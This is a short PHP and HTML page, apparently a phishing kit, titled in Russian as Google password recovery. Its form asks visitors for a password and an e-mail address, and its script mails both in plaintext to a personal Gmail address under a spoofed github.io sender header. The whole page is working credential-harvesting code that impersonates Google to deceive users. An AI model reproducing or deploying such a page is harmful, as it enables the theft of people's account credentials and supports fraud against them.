<html>
<head>
<title>Google восстановление пароля</title>
</head>
<body>
<?php
//проверяем, существуют ли переменные в массиве POST
if(!isset($_POST['pwd']) and !isset($_POST['email'])){
 ?> <form action="send.php" method="post">
<input type="text" name="pwd" placeholder="Укажите пароль" required>
<input type="text" name="email" placeholder="Укажите e-mail" required>
<input type="submit" value="Отправить">
</form> <?php
} else {
 //показываем форму
 $pwd = $_POST['pwd'];
 $email = $_POST['email'];
 $pwd = htmlspecialchars($pwd);
 $email = htmlspecialchars($email);
 $pwd = urldecode($pwd);
 $email = urldecode($email);
 $pwd = trim($pwd);
 $email = trim($email);
 if (mail("nikitings1673@gmail.com", "Заявка с сайта", "Password:".$pwd.". E-mail: ".$email ,"From: info@nikitings.github.io \r\n")){
 echo "Сообщение успешно отправлено";
 } else {
 echo "При отправке сообщения возникли ошибки";
 }
}
?>
</body>
</html>